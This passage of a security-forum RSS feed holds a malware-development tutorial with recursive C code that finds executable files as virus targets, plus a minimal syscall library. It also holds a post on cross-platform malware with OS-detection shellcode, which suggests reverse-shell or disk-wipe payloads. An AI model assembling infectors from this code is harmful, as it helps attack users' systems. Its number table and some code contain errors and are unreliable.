          precision for the following timestamp fields.
          For the details before Linux 2.6, see NOTES. */

        struct timespec st_atim;  /* Time of last access */
        struct timespec st_mtim;  /* Time of last modification */
        struct timespec st_ctim;  /* Time of last status change */
};
</code></pre>
<p>The most interesting field for us is <code>st_mode</code>, but there is a lot of other useful information that we will be using in the future. The structure is describe in the <code>stat</code> man page for your future references.</p>
<h1>Understanding the <code>st_mode</code> field</h1>
<p>The <code>st_mode</code> field encodes the type of file and also the permissions. The man page includes some sample code showing us how to access that information. So, the way to access the type of file is using the bit mask <code>S_IFMT</code>:</p>
<pre><code class="lang-auto">struct st sb;
stat (a_file_name, &amp;sb);
int type = sb.st_mode &amp; S_IFMT
</code></pre>
<p>The <code>&amp;</code> operator is a bitwise AND… It basically matches two binary numbers and only the bits that are the same remains. Let’s see what is in <code>S_IFMT</code>. I can tell you directly, but I believe it is going to be good for you to learn how to get this information by yourself, so you can find whatever you want  in the future.</p>
<p>We will start looking in the header files indicated by the man page. At the top of the man page you will see the <code>includes</code> you need to add to your program to use the system call.</p>
<pre><code>NAME
       stat, fstat, lstat, fstatat - get file status

SYNOPSIS
       #include &lt;sys/types.h&gt;
       #include &lt;sys/stat.h&gt;
       #include &lt;unistd.h&gt;
</code></pre>
<p>The <code>sys/types.h</code> sounds pretty generic so I will skip it (you can actually look into it, but you won’t find anything). So let’s look into <code>sys/stat.h</code> that sounds more like the specifics for <code>stat</code>.</p>
<pre><code>$ grep "IFMT" /usr/include/sys/stat.h
# define S_IFMT         __S_IFMT
#define __S_ISTYPE(mode, mask)  (((mode) &amp; __S_IFMT) == (mask))
</code></pre>
<p>Well, looks like the actual value is defined somewhere else, but we can see also a macro to quickly check against the different types. We can use it like:</p>
<pre><code class="lang-auto">__S_ISTYPE(sb.st_mode,S_IFREG)
// is equivalent to
(((sb.st_mode) &amp; __S_IFMT) == (S_IFREG)
</code></pre>
<p>That second define is called a macro. They work the same than the normal defines (they are just substituted by its value in the code before compiling) but we can use parameters to write more complex expressions. When we use parameters, the <code>define</code> is said to define a macro instead of a constant.</p>
<p>So, in order to find out the actual value of <code>S_IFMT</code>, we need to look into the includes, included by the include :).</p>
<pre><code>$ grep "#include" /usr/include/sys/stat.h
#include &lt;features.h&gt;
#include &lt;bits/types.h&gt;         /* For __mode_t and __dev_t.  */
#include &lt;bits/stat.h&gt;
</code></pre>
<p><em>NOTE:I’m using grep to show this information. It is, in general, very handy to do it this way, but I would recommend, at the beginning, to find these information manually, that is, opening the file in an editor and browse through it. The reason is that you will see how this system include files look like and get familiar with them. You will also find curious thing that will spark your curiosity.</em></p>
<p>Again, we can go through all of them systematically, but <code>bits/stat.h</code> looks like the best candidate.</p>
<pre><code>$ grep "IFMT" /usr/include/bits/stat.h
#define __S_IFMT        0170000 /* These bits determine file type.  */
</code></pre>
<p>We found it!. Actually if we open the file, we will also find, all the other relevant constants. These are the ones:</p>
<pre><code class="lang-auto">#define __S_IFMT        0170000 /* These bits determine file type.  */

/* File types.  */
#define __S_IFDIR       0040000 /* Directory.  */
#define __S_IFCHR       0020000 /* Character device.  */
#define __S_IFBLK       0060000 /* Block device.  */
#define __S_IFREG       0100000 /* Regular file.  */
#define __S_IFIFO       0010000 /* FIFO.  */
#define __S_IFLNK       0120000 /* Symbolic link.  */
#define __S_IFSOCK      0140000 /* Socket.  */

/* Protection bits.  */

#define __S_ISUID       04000   /* Set user ID on execution.  */
#define __S_ISGID       02000   /* Set group ID on execution.  */
#define __S_ISVTX       01000   /* Save swapped text after use (sticky).  */
#define __S_IREAD       0400    /* Read by owner.  */
#define __S_IWRITE      0200    /* Write by owner.  */
#define __S_IEXEC       0100    /* Execute by owner.  */
</code></pre>
<p>But. Wait a minute!. Those numbers look a bit weird isn’t it?</p>
<h1>Base 8, octal numbers</h1>
<p>So far we have been using decimal numbers (using base 10) and also hexadecimal numbers (using base 16). OK, true, and binaries (using base 2). However there is another base that is useful when working with computers. This is base 8 and the numbers represented in this base are said to be in octal format.</p>
<p>In C, you can write octal numbers just adding a <code>0</code> at the beginning of the number, the same way that we add a <code>0x</code> to represent an hexadecimal value. Octal representation is useful when we need to manipulate blocks of 3 bits (0 to 7… that’s eight values, hence octal). So, let’s try to understand the values of the constants used by <code>stat</code>.</p>
<p>To understand how this matches to the hexadecimal representation, let’s just count using both bases:</p>
<pre><code>HEX   OCT  BIN
0     0    0000 0000
1     1    0000 0001  &lt;--
2     2    0000 0010  &lt;--
3     3    0000 0011 
4     4    0000 0100  &lt;--
5     5    0000 0101
6     6    0000 0110
7     7    0000 0111
8    10    0000 1000
9    11    0000 1001  &lt;--
A    12    0000 1010  &lt;--
B    13    0000 1011
C    14    0000 1100 &lt;--
D    15    0000 1101
F    16    0000 1110
10   17    0000 1111
11   21    0001 0000
</code></pre>
<p>As you can see, when using the octal representation, the first digit of our number is actually the value of the lower 3 bits of the number. Each position in the number, represents the next 3 bytes, so the octal representation is very useful when we need to work with blocks of 3 bits, instead of 4 (we use hexadecimal in those cases).</p>
<p>For instance, check this out. Hopefully it will look familiar to you:</p>
<pre><code>chmod 777 afile
      000 111 111 111 -&gt; 0777
      0001 1111 1111  -&gt; 0x1ff
</code></pre>
<p>Both number <code>0x1ff</code> and <code>0777</code> are the same number (511 in decimal), but the octal representation allows us to write the digits as groups of three bits. In this case, each bit represent the execution, read and write permissions for the file. Imagine to use <code>chmod</code> with the decimal or hexadecimal numbers… It would be very tricky to change permissions of a file like that.</p>
<p>Anyhow and summing up, octal representation is used here and there whenever it is convenient to access the bits in a number in groups of three and not four. And one of these cases is the file permissions.</p>
<h1>Back to the <code>st_mode</code> constants</h1>
<p>Now, we can look again to the <code>st_mode</code> constants:</p>
<pre><code class="lang-auto">#define __S_IFMT        0170000 /* These bits determine file type.  */

/* File types.  */
#define __S_IFDIR       0040000 /* Directory.  */
#define __S_IFCHR       0020000 /* Character device.  */
#define __S_IFBLK       0060000 /* Block device.  */
#define __S_IFREG       0100000 /* Regular file.  */
#define __S_IFIFO       0010000 /* FIFO.  */
#define __S_IFLNK       0120000 /* Symbolic link.  */
#define __S_IFSOCK      0140000 /* Socket.  */

/* Protection bits.  */

#define __S_ISUID       04000   /* Set user ID on execution.  */
#define __S_ISGID       02000   /* Set group ID on execution.  */
#define __S_ISVTX       01000   /* Save swapped text after use (sticky).  */
#define __S_IREAD       0400    /* Read by owner.  */
#define __S_IWRITE      0200    /* Write by owner.  */
#define __S_IEXEC       0100    /* Execute by owner.  */
</code></pre>
<p>Let’s first figure out the structure of this field. Representing the different octal values as bit masks. You can check the table in the previous section to verify the values, but we just use blocks of 3 bits…</p>
<pre><code>001 111 000 000 000 000  -&gt; __S_IFMT   (0170000)
000 100 000 000 000 000  -&gt; __S_IFDIR  (0040000)
000 010 000 000 000 000  -&gt; __S_IFCHR  (0020000)
000 110 000 000 000 000  -&gt; __S_IFBLK  (0060000)
001 000 000 000 000 000  -&gt; __S_IFREG  (0100000)
000 001 000 000 000 000  -&gt; __S_IFIFO  (0010000)
001 010 000 000 000 000  -&gt; __S_IFLNK  (0120000)
001 100 000 000 000 000  -&gt; __S_IFSOCK (0140000)
  ^ ^^^	
000 000 100 000 000 000  -&gt; __S_ISUID  (0004000)
000 000 010 000 000 000  -&gt; __S_ISGID  (0002000)
000 000 001 000 000 000  -&gt; __S_ISVTX  (0001000)
        ^^^	
000 000 000 100 000 000  -&gt; __S_IREAD  (0000400)
000 000 000 010 000 000  -&gt; __S_IWRITE (0000200)
000 000 000 001 000 000  -&gt; __S_IEXEC  (0000100)
            ^^^
</code></pre>
<p>As we can see the <code>__S_IFMT</code> is a mask to extract the high bits from the field that identify the type of file. Also note how the constant for the types of files have been defined as high numbers so we can compare directly just after ANDing the mask.</p>
<p>After the type of file, we find the special file attributes that indicates if the file is <em>SetUID</em> or <em>SetGUID</em> and also if the sticky bit is activate. And after that follows the file permissions for the owner, the group and the rest of users.</p>
<p>Yes, you are right, <code>bits/stat.h</code> only defines the mask for the owner. Actually, the constant defined above shouldn’t be used by normal programs, we should use the ones redefined in <code>sys/stat.h</code>. I will include them here for you to check them out:</p>
<pre><code class="lang-auto">/* Protection bits.  */

#define S_ISUID __S_ISUID       /* Set user ID on execution.  */
#define S_ISGID __S_ISGID       /* Set group ID on execution.  */

#define S_IRUSR __S_IREAD       /* Read by owner.  */
#define S_IWUSR __S_IWRITE      /* Write by owner.  */
#define S_IXUSR __S_IEXEC       /* Execute by owner.  */
/* Read, write, and execute by owner.  */
#define S_IRWXU (__S_IREAD|__S_IWRITE|__S_IEXEC)

#define S_IRGRP (S_IRUSR &gt;&gt; 3)  /* Read by group.  */
#define S_IWGRP (S_IWUSR &gt;&gt; 3)  /* Write by group.  */
#define S_IXGRP (S_IXUSR &gt;&gt; 3)  /* Execute by group.  */
/* Read, write, and execute by group.  */
#define S_IRWXG (S_IRWXU &gt;&gt; 3)

#define S_IROTH (S_IRGRP &gt;&gt; 3)  /* Read by others.  */
#define S_IWOTH (S_IWGRP &gt;&gt; 3)  /* Write by others.  */
#define S_IXOTH (S_IXGRP &gt;&gt; 3)  /* Execute by others.  */
/* Read, write, and execute by others.  */
#define S_IRWXO (S_IRWXG &gt;&gt; 3)
</code></pre>
<p>I had removed a couple of lines to make easier reading the file. Here you can see how all constants are redefined, and the group and other permissions are just redefined as shifted versions of the original user masks we have just seen.</p>
<blockquote>
<p>NOTE: The <code>&gt;&gt;</code> operator shifts all the bits of the left hand operand to the right as many positions as the right hand operand indicates. <code>S_IRUSR &gt;&gt; 3</code> will shift <code>S_IRUSR</code> value 3 positions to the right. In this case: <code>S_IRUSR = __S_IREAD = 0000400</code> shifting this three positions to the right will produce <code>040</code> (remember octal digits works on groups of 3 bits).</p>
</blockquote>
<p>Well, this has been a kindof a digression, but this concepts are usually confusing for the beginners and I though it would be great to add some explanation in the course,</p>
<h1>Back to our <code>select_target</code>
</h1>
<p>So, know we can modify our <code>select_target</code> to find the kind of files we are interested on. This is how the new function will look like:</p>
<pre><code class="lang-auto">int select_target (PAYLOAD_FUNC pf) {
  char                buf[BUF_SIZE];
  struct linux_dirent *de;
  struct stat         st;
  int                 fd, n, i;
  
  if ((fd = open (folder, O_RDONLY | O_DIRECTORY)) &lt; 0) MFW_EXIT("open:");

  while (1) {
    n = getdents (fd, buf, BUF_SIZE);
    if (n &lt; 0) MFW_EXIT ("getdents:");
    if (n == 0) break;

    for (i = 0; i &lt; n;) {
      de = (struct linux_dirent *)(buf + i);
	  
      if ((fstatat (fs, de-&gt;d_name, &amp;st)) &lt; 0) {
		  perror ("stat:");
		  continue; // Just ignore the error
      }
      if (((st.st_mode &amp; S_IFMT) == S_IFREG)
		  &amp;&amp; (st.st_mode &amp; 00111))
		  pf (target);
      
      i += de-&gt;d_reclen;

    }
  }
 done:
  close (fd);
  return 0;
}
</code></pre>
<p>Two comments on this code:</p>
<ol>
<li>We have used <code>fstatat</code> instead of <code>fstat</code> or <code>stat</code>, so we do not have to build the full path to the file before calling <code>stat</code>. This syscall uses the directory file descriptor as base and tried to look for the file <strong>AT</strong> the directory that we pass as first parameter. In this case it is very convenient and we avoid allocating memory for strings and concatenating them.</li>
<li>This is the <code>select_target</code> for a virus. We are checking that the directory entry is a regular file (<code>S_IFREG</code>) and then we check that it is executable. In this case we are just checking for all possible executable permissions but that may be different in a real case.</li>
</ol>
<p>The permission checking could also be written like:</p>
<pre><code class="lang-auto">st.st_mode &amp; 00111; // Is the same than
st.st_mode &amp; (S_IXUSR|S_IXGRP|S_IXOTH)
</code></pre>
<p>Second one is better as you can easily see what we are comparing to… and the generated code would be the same… But first one is shorter and I chose that.</p>
<p>Now, you can try to change the program to look for other kind of files as it my happen in the case of ransomware or spyware. But you need a last piece of knowledge in order to be able to complete the implementation of <code>select_target</code>.</p>
<h1>Recursive functions</h1>
<p>The problem with our current <code>select_target</code> is that, it can only scan a single directory. In general, we should be able to scan the whole disk, that means that, we need to modify the function so, each time we find a directory, we also scan it. Or in other words, each time we find a directory we need to call ourselves again with the new directory name to scan.</p>
<p>A function that call itself is known as a recursive function. Recursive functions are very powerful and usually allows us to write very small and elegant code to deal with complex problems. A classical example is traversing a tree. It is way easier to do it with a recursive function that with normal iterative code.</p>
<p>In general, recursive function trades code complexity with memory usage. That is normal, we always trade either speed, memory or complexity. That’s life. A recursive function will make extensive use of the stack creating stack frames again and again each time it calls itself. But other than that they are neat solutions to many problems, and usually requires way less code that an iterative solution.</p>
<h1>A recursive <code>select_target</code>
</h1>
<p>So, it’s time to modify our program to be able to scan the whole disk. For that we will need to modify the function signature, so we get the current folder being scanned in the stack frame of our function and we can continue our work at the right place after processing every subfolder.</p>
<p>We will also add some messages and some indention to the function, for easily check that your function is working fine:</p>
<pre><code class="lang-auto">
int level = 0;
char tabs[1024];

int payload (char *target) {
  printf ("%s Doing malware things to %s\n", tabs, target);
}

int select_target (int old_fd, char *folder, PAYLOAD_FUNC pf) {
  char                buf[BUF_SIZE];
  int                 flag = 1;
  struct linux_dirent *de;
  struct stat         st;
  int                 fd, n, i;
  
  // Scan directory

  // Open directory using open
  printf ("%s Processing : %s\n", tabs, folder); 
  if ((fd = openat (old_fd, folder, O_RDONLY | O_DIRECTORY)) &lt; 0) MFW_EXIT("open:");
  // Update indentation string
  tabs[level] = ' ';
  level ++;
  
  while (flag) {
    n = getdents (fd, buf, BUF_SIZE);
    if (n &lt; 0) MFW_EXIT ("getdents:");
    if (n == 0) break;

    // Build file name
    for (i = 0; i &lt; n;) {
      de = (struct linux_dirent *)(buf + i);
      if ((fstatat (fd, de-&gt;d_name, &amp;st, 0)) &lt; 0) {
	    perror ("stat:");
	    continue; // Just ignore the error&lt;- This is a bug can you fix it?
      }
      if (((st.st_mode &amp; S_IFMT) == S_IFREG)
	        &amp;&amp; (st.st_mode &amp; 00111))
	           pf (de-&gt;d_name);
      else if (((st.st_mode &amp; S_IFMT) == S_IFDIR)
	             &amp;&amp; !(de-&gt;d_name[0] == '.'
		              &amp;&amp; (de-&gt;d_name[1] == 0
		                  || (de-&gt;d_name[1] == '.' &amp;&amp; de-&gt;d_name[2]==0))))
	                          select_target (fd, de-&gt;d_name, pf);
	 
      i += de-&gt;d_reclen;
    }
  }
  // Remove indentation
  tabs[level] = 0;
  level--;
  close (fd);
  return 0;
}
</code></pre>
<p>Despite the indentation thingy (we just add a space to a string every time we enter the function and remove it every time we left), there are two main changes:</p>
<pre><code class="lang-auto">  if ((fd = openat (old_fd, folder, O_RDONLY | O_DIRECTORY)) &lt; 0) MFW_EXIT("open:");
</code></pre>
<p>We have changed <code>open</code> for <code>openat</code>. This works the same than <code>statat</code>, we just pass as first parameter a file descriptor and, if the second parameter (the <code>pathname</code>) is relative it will open the file from the indicated directory, otherwise, if the path is absolute, will behave like a normal open.</p>
<p>This is convenient so we do not need to build the full file name ourselves. That is not a big deal (<code>strcpy</code>+ <code>strcat</code>), but this way we do not have to.</p>
<p>The second change is the recursive call. Basically, we just need to check if the directory entry is a directory. If that is the case we call ourselves again with the sub-directory name. However, remember the <code>.</code> and <code>..</code> entries we mentioned in last instalment?.. Sure, you do… well, we need to skip those, otherwise we get into an infinite loop… This is the rest of the check.</p>
<pre><code class="lang-auto">if (((st.st_mode &amp; S_IFMT) == S_IFDIR)
	             &amp;&amp; !(de-&gt;d_name[0] == '.'
		              &amp;&amp; (de-&gt;d_name[1] == 0
		                  || (de-&gt;d_name[1] == '.' &amp;&amp; de-&gt;d_name[2]==0))))
	                          select_target (fd, de-&gt;d_name, pf);
</code></pre>
<p>So, our <code>select_target</code> for malwares that need to look for files is ready.</p>
<h1>Removing libC</h1>
<p>So, we have been learning a lot about C programming, and we haven’t talked much about asm. We will be looking to assembler in the coming instalments, but before starting with that we are going to remove the libc dependencies from our current test program, so we can have full control on the assembler version we are going to generate.</p>
<p>So far, we are using the following system calls:</p>
<pre><code>exit
write
openat
close
getdents
fstatat
</code></pre>
<p>So, our first task will be to generate a mini libc version for our program. This is easier than expected:</p>
<pre><code class="lang-auto">	.global mfw_exit
	.global mfw_write
	.global mfw_close
	.global mfw_openat
	.global mfw_newfstatat
	.global mfw_getdents
	
mfw_write:
	mov $0x01, %eax
	syscall
	ret
	
mfw_openat:
	mov $0x101, %eax
	syscall
	ret
	
mfw_close:
	mov $0x03, %eax
	syscall
	ret

mfw_exit:
	mov $0x3c, %eax
	syscall
	ret

mfw_newfstatat:
	mov %rcx, %r10
	mov %0x106, %eax
	syscall
	ret

mfw_getdents:
	mov $78, %eax
	syscall
	ret

mfw_open:
	mov $0x02, %eax
	syscall
	ret

mfw_lstat:
	mov $0x06, %eax
	syscall
	ret

</code></pre>
<p>Have you noticed something strange?. The implementation of all syscalls is pretty straightforward, except for the <code>fstatat</code>. This syscall has a peculiarity. The C ABI and the kernel ABI are different for the forth parameter. C function get that parameter on <code>RCX</code> as we already know, but the kernel syscalls expect them on <code>R10</code>. I forgot about that and expend quite sometime figuring out why the syscall was failing.</p>
<h1>The final version</h1>
<p>So, this is how the final version will look like:</p>
<pre><code class="lang-auto">#include &lt;fcntl.h&gt;
#include &lt;sys/types.h&gt;  
#include &lt;sys/stat.h&gt;   // Stat struct

#define BUF_SIZE 1024

// XXX: Move this to a .h file
// Dirent Data struct
struct linux_dirent {
  long           d_ino;
  long           d_off;
  unsigned short d_reclen;
  char           d_name[];
};

int     mfw_getdents (int fd, char *buf, int len);
int     mfw_exit (int r);
int     mfw_openat(int dirfd, const char *pathname, int flags);
int     mfw_newfstatat (int dirfd, char *p, struct stat *st, int flags);
int     mfw_close (int fd);
size_t  mfw_write(int fd, const void *buf, size_t count);

#define MFW_EXIT(s) do {mfw_exit (1);} while (0)

typedef int (*PAYLOAD_FUNC)(char *);

// Global vars
int level = 0;
char tabs[1024];

int mfw_puts (char *s) {
  while (*s) mfw_write (1, s++, 1);
}

// Helper function to write tabbed strings 
int mfw_print_tstr (char *s, char *v) {
  mfw_puts (tabs);
  mfw_puts (s);
  if (v) mfw_puts (v);
  mfw_puts ("\n");
}

int payload (char *target) {
  mfw_print_tstr ("   ++ Doing malware things to ", target);
}

int select_target (int old_fd, char *folder, PAYLOAD_FUNC pf) {
  char                buf[BUF_SIZE];
  struct linux_dirent *de;
  struct stat         st;
  int                 fd, n, i;

  tabs[level] = ' ';
  level ++;

  mfw_print_tstr ("&gt;&gt; Entering ", folder);

  if ((fd = mfw_openat (old_fd, folder, O_RDONLY | O_DIRECTORY)) &lt; 0) goto clean;
  
  while (1) {
    n = mfw_getdents (fd, buf, BUF_SIZE);
    if (n &lt; 0) continue; // Silently ignore errors
    if (n == 0) break;

    for (i = 0; i &lt; n;) {
      de = (struct linux_dirent *)(buf + i);
      if ((mfw_newfstatat (fd, de-&gt;d_name, &amp;st, 0)) &lt; 0) goto next;
      
      if (((st.st_mode &amp; S_IFMT) == S_IFREG) &amp;&amp; (st.st_mode &amp; 00111))
	    pf (de-&gt;d_name);
      else if (((st.st_mode &amp; S_IFMT) == S_IFDIR)
	       &amp;&amp; !(de-&gt;d_name[0] == '.'
		     &amp;&amp; (de-&gt;d_name[1] == 0
		         || (de-&gt;d_name[1] == '.' &amp;&amp; de-&gt;d_name[2]==0))))
	    select_target (fd, de-&gt;d_name, pf);
    next:
      i += de-&gt;d_reclen;
    }
  }
 clean:
  mfw_print_tstr ("&lt;&lt; Leaving ", folder);
  tabs[level] = 0;
  level--;
  mfw_close (fd);
  return 0;
}

int main (int argc, char *argv[]) {
  for (int i = 0; i &lt; 1024; tabs[i++] = 0);
  while (select_target(0, argv[1], payload));
}

</code></pre>
<p>As I did last time. This version has a few updates that I haven’t described in the text. Try to understand what they are for and do not hesitate to ask your questions in case you cannot figure it out by yourself.</p>
<p>I named the asm code in previous section <code>minilibc.S</code>. So, in order to compile my program I have to do:</p>
<pre><code>gcc -o select_files select_file.c minilibc.S
</code></pre>
<h1>Conclusion</h1>
<p>We have now working code to scan a disk and test some basic file information as the type of file and the permissions. We have also learned how to navigate the system include files to find out the information we need and also how to master the octal numeric representation.</p>
<p>We have removed the libC dependencies and we are ready for a asm implementation. We will find out if that asm implementation worth the extra effort, and after that we will be ready to get started with some simple payload…</p>
<h2>Read the whole series here</h2>
<p><a href="https://0x00sec.org/t/programming-for-wanabes-vii-finding-files-i/25662">Part VII. Finding files</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-vi-malware-introduction/25595">Part VI. Malware Introduction</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-v-a-dropper/23090">Part V. A dropper</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-iv/22421">Part IV. The stack</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabees-part-iii-your-first-shell-code/1279">Part III. Your first Shell Code</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-ii-and-a-half/1196">Part II and a Half. Part II for ARM and MIPS</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-ii/1164">Part II. Shrinking your program</a><br>
<a href="https://0x00sec.org/t/programming-for-wannabes-part-i/1143">Part I. Getting Started</a></p>
            <p><small>5 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/programming-for-wanabes-viii-file-details/25738">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/programming-for-wanabes-viii-file-details/25738</link>
          <pubDate>Tue, 20 Apr 2021 21:18:04 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-25738</guid>
          <source url="https://0x00sec.org/t/programming-for-wanabes-viii-file-details/25738.rss">Programming for Wanabes VIII. File Details</source>
        </item>
        <item>
          <title>How do you learn WinApi</title>
          <dc:creator><![CDATA[n33ds0n]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>1: Can you tell us how you learned all about the windows API</p>
<p>2: How do you master it.</p>
<p>3: What are the resources you used while learning the windows API</p>
<p>4: Share the resources you used with us</p>
<p>5: Which programing language you used C or C++</p>
<p>6: Tell us more</p>
<p>More important the resources(link, PDF video anything just where)</p>
<p>Thanks <img src="https://0x00sec.org/images/emoji/twitter/heart.png?v=9" title=":heart:" class="emoji" alt=":heart:"></p>
            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-do-you-learn-winapi/25678">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-do-you-learn-winapi/25678</link>
          <pubDate>Thu, 15 Apr 2021 21:15:53 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-25678</guid>
          <source url="https://0x00sec.org/t/how-do-you-learn-winapi/25678.rss">How do you learn WinApi</source>
        </item>
        <item>
          <title>Multi Platform Execution</title>
          <dc:creator><![CDATA[crimsonRain]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>This is my first post so don’t expect anything much, just sharing an idea is all. Shoutout to <a class="mention" href="https://0x00sec.org/u/leeky">@Leeky</a> and <a class="mention" href="https://0x00sec.org/u/jeff">@jeff</a> for helping out in regards to OS detection as I’m pretty unfamiliar with it. I recently came across an interesting project called <a href="https://github.com/jart/cosmopolitan" rel="noopener nofollow ugc">cosmopolitan</a>. The part about this project that makes it interesting is that the binaries compiled using comopolitan is that it’s a compile once and run anywhere. What this means is that you can run the binary without it being compiled specifically for a single OS, but rather is able to be executed using a <a href="https://www.youtube.com/watch?v=VVdmmN0su6E" rel="noopener nofollow ugc">polyglot format</a> called αcτµαlly pδrταblε εxεcµταblε (pretty aesthetic name, I know) or APE for short. In a nutshell, polyglot formats are files that can be interpreted in different formats depending on what program opens that file. The case of binaries compiled with cosmopolitan falls under this case as different OS loaders are able to properly execute the binary.</p>
<p>I kept thinking of what could be made with such a project as there was no longer a limitation of compiling OS specific binaries. One of the things that came to mind was multi platform malware. I could easily see how malware could be made “multi platform” through scripts but I’ve never heard of the binary itself being multi platform. Realizing this, I tried to see if there were any caveats using this project. Well, there were quite a few but they shouldn’t mean much in MalDev:</p>
<ul>
<li>The project doesn’t support any desktop GUIs hence “textmode” in their github description.</li>
<li>The binary “will assimilate itself as a conventional resident of your platform after the first run” this means, after the first run, the binary is no longer multi platform sadly. Needless to say, if we require that the binary propagates, we need save a copy of it before execution. The only thing I could think of is the binary copying itself on disk during runtime, note that this may be entirely wrong as I’m assuming that the assimilation process happens at the end of execution.</li>
</ul>
<pre><code class="lang-auto">Note that I'm no way responsible for any damage the reader may do using this technique and I'm assuming the reader is a responsible person.
</code></pre>
<h1>Setup</h1>
<p>Now enough intro, let’s get started. We’re going to be developing in Linux since it’s far easier to set up due to the fact that developing on Mac or Windows would require installing gnu linux toolchain before compiling cosmopolitan. To get started we run the following as mentioned on the github:</p>
<pre><code class="lang-auto">mkdir mal &amp;&amp; cd mal
wget https://justine.lol/cosmopolitan/cosmopolitan-amalgamation-0.3.zip
unzip cosmopolitan-amalgamation-0.3.zip
</code></pre>
<p>And that’s it, we just need to stay in the current directory in order for this to work.</p>
<h1>Execution?</h1>
<p>It is commonly known that malware has OS specific techniques and the only thing in our way is to know when to use these OS specific techniques. The only challenge now is to when to use these OS specific techniques. There are two ways we could do this:</p>
<ol>
<li>
<p>A high level method such as looking for presence of paths such as /root, /lib, /bin vs C:\ (thanks uncle jeff)</p>
</li>
<li>
<p>A low level method of using <a href="https://modexp.wordpress.com/2016/06/02/shellcode-detection/" rel="noopener nofollow ugc">Assembly to detect the running OS</a> (thanks Leeky)</p>
</li>
</ol>
<p>Well the point of the post is not to write full fledged malware but rather prove that it is possible to produce a binary that does its malicious job regardless of the OS. In accordance to this, we’ll try to execute payload that pops a shell. This doesn’t seem malicious you say? Well you can swap the payload for a reverse shell, a forkbomb or a nasty disk wipe if they make the binary qualify as malware.</p>
<h1>High Level</h1>
<p>Now let’s test if our OS detection techniques work before executing some payload. We’re going to start off with the first method since it seems to be the easier of the two to implement. The source code and the command to compile the source is as follows:</p>
<pre><code class="lang-auto">int main() {
        char * OS = "None";
        if(isdirectory("C:\\"))
                OS = "Windows";
        else if(isdirectory("/root"))
                OS = "Linux";

        printf("The current OS is %s\n", OS);
}
</code></pre>
<pre><code class="lang-auto">gcc -g -Os -static -nostdlib -nostdinc -fno-pie -no-pie -mno-red-zone \
  -fno-omit-frame-pointer -pg -mnop-mcount \
  -o test.com.dbg test.c -fuse-ld=bfd -Wl,-T,ape.lds \
  -include cosmopolitan.h crt.o ape.o cosmopolitan.a
objcopy -S -O binary test.com.dbg test.com
</code></pre>
<p>It’s nice how we don’t have to manually write out includes. Anyway, the code is fairly straightforward. The checking is done through looking for the existence of a particular root directory. If you run this binary in a Windows machine, “The current OS is Windows” should be printed to stdout, otherwise it will output “The current OS is Linux”. Upon execution, we get the following output on the Windows host and Linux VM respectively.</p>
<pre><code class="lang-auto">C:\Users\crimsonRain\Desktop&gt;test.com
The current OS is Windows
</code></pre>
<pre><code class="lang-auto">crimsonRain@Desktop:~/mal$./test.com
The current OS is Linux
</code></pre>
<p>Happily enough, this works on both Windows 10 and on Ubuntu. Note that I compiled the binary in WSL then copied it to the directory /mnt/c/Users/crimsonRain/Desktop. Since our first method works, let’s now try the second one.</p>
<h1>Low Level</h1>
<p>As expected, this was the lengthiest to implement as there is a lack of shellcode in regards to OS detection. Though <a href="https://modexp.wordpress.com/2016/06/02/shellcode-detection/" rel="noopener nofollow ugc">this</a> is the only available post on Multi OS Shellcode, it sadly doesn’t work for Windows 10. Luckily enough, using <a href="https://web.archive.org/web/20160409113027/http://www.chokepoint.net/2013/09/building-multiplatform-shellcode-header.html" rel="noopener nofollow ugc">this post</a> which was referenced in the previous one we are able to customize the given shellcode to suit our needs. The following is the shellcode creation process.</p>
<pre><code class="lang-auto">  bits 32
arch_detect:
  xor eax, eax
  dec eax
  jnz determine_32_os

determine_64_os:
  mov eax, ds
  test eax, eax
  jnz win64_code
  jmp lin64_code

determine_32_os:
  mov eax, fs
  test eax, eax
  jz lin32_code

win32_code:
  xor eax, eax
  ret

lin64_code:
  xor eax, eax
  mov al, 1
  ret

win64_code:
  xor eax, eax
  mov al, 2
  ret

lin32_code:
  xor eax, eax
  mov al, 3
  ret
</code></pre>
<p>Let’s go through the code for a bit. If we run this in a 32 bit system, the jnz under arch_detect would have eax set as -1. If we run this in a 64 bit system however, the dec eax instruction becomes the REX.W prefix for the jnz as outline in <a href="https://stackoverflow.com/questions/50978180/programmatically-detect-cpu-architecture-at-runtime" rel="noopener nofollow ugc">prl’s answer</a>. The next part is the determine_64_os label, if we are in a Linux system, the ds segment register is nearly always zero while the opposite is true for Windows. The determine_32_os label is somewhat similar where a Linux system sets the fs segment register to 0 while once again the opposite is true for Windows. The rest of the code is self explanatory as we set 0, 1, 2, 3 as markers to identify the running OS. Continuing on:</p>
<pre><code class="lang-auto">nasm -felf32 shellcode.asm
objcopy -O binary -j .text shellcode.o 
</code></pre>
<p>We have proper shellcode that we want to use, we then get the binary data as a hex string and use it in the following source code:</p>
<pre><code class="lang-auto">int get_os() {
        unsigned char * exec = "\x31\xc0\x48\x75\x08\x8c"
                               "\xd8\x85\xc0\x75\x10\xeb"
                               "\x09\x8c\xe0\x85\xc0\x74"
                               "\x0d\x31\xc0\xc3\x31\xc0"
                               "\xb0\x01\xc3\x31\xc0\xb0"
                               "\x02\xc3\x31\xc0\xb0\x03"
                               "\xc3";
        int (*_get_os)() = (int(*)())exec;
        return _get_os();
}

int main() {
        printf("%d\n", get_os());
        return 0;
}
</code></pre>
